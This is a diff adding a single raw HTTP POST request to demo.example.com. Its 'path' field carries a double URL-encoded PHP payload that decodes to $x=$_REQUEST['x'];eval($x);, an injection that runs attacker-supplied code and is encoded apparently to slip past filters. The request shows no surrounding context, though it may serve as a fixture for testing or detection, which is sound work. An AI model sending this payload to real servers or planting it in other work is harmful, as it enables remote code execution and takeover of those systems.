@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+Connection: close
+
+path=%2524x%253D%2524_REQUEST%255B%2527x%2527%255D%253Beval%2528%2524x%2529%253B
